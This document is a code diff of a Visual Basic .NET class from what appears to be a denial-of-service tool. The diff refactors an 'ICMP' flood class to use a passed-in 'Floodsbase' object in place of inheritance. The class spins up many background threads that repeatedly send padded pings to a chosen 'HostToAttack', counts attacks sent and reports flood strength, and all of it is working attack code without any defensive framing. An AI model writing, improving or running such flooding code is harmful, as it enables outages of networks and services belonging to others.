@@ -1,7 +1,7 @@
 ﻿Imports System.Text
 Imports System.Threading
 Imports System.Net.NetworkInformation
-Class ICMP : Inherits Floodsbase
+Class ICMP
     Private _ThreadsEnded = 0
     Private HostToAttack As String
     Private TimetoAttack As Integer
@@ -11,8 +11,9 @@ Class ICMP : Inherits Floodsbase
     Private Attacks As Integer = 0
     Private Threadsto As Integer
     Private Length As Integer
-
-    Public Sub New(ByVal model As ICMPModel)
+    Private _Floodsbase As Floodsbase
+    Public Sub New(ByVal model As ICMPModel, ByVal Floodsbase As Floodsbase)
+        _Floodsbase = Floodsbase
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.Host
@@ -21,14 +22,14 @@ Class ICMP : Inherits Floodsbase
             Threadsto = model.ThreadstoUse
             Length = model.Length
             Threads = New Thread(Threadsto - 1) {}
-            SetMessage("ICMP Flood started!")
+            _Floodsbase.SetMessage("ICMP Flood started!")
             For i As Integer = 0 To Threadsto - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
                 Threads(i).Start()
             Next
         Else
-            SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
+            _Floodsbase.SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
         End If
     End Sub
 
@@ -38,7 +39,7 @@ Class ICMP : Inherits Floodsbase
             _ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
+            _Floodsbase.SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         End If
@@ -53,11 +54,11 @@ Class ICMP : Inherits Floodsbase
                 End Try
             Next
             AttackRunning = False
-            SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
+            _Floodsbase.SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         Else
-            SetMessage("No Condis Attack is Running!")
+            _Floodsbase.SetMessage("No Condis Attack is Running!")
         End If
     End Sub
 
@@ -79,8 +80,8 @@ Class ICMP : Inherits Floodsbase
                     Dim Timeout As Integer = 10000
                     Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
                     Attacks = Attacks + 1
-                    Set_AttackStrengOnByte(Attacks * Length)
-                    GetAttackStrengOnByteOnSec(stopwatch)
+                    _Floodsbase.Set_AttackStrengOnByte(Attacks * Length)
+                    _Floodsbase.GetAttackStrengOnByteOnSec(stopwatch)
                     Continue Do
                 Catch
                     Continue Do
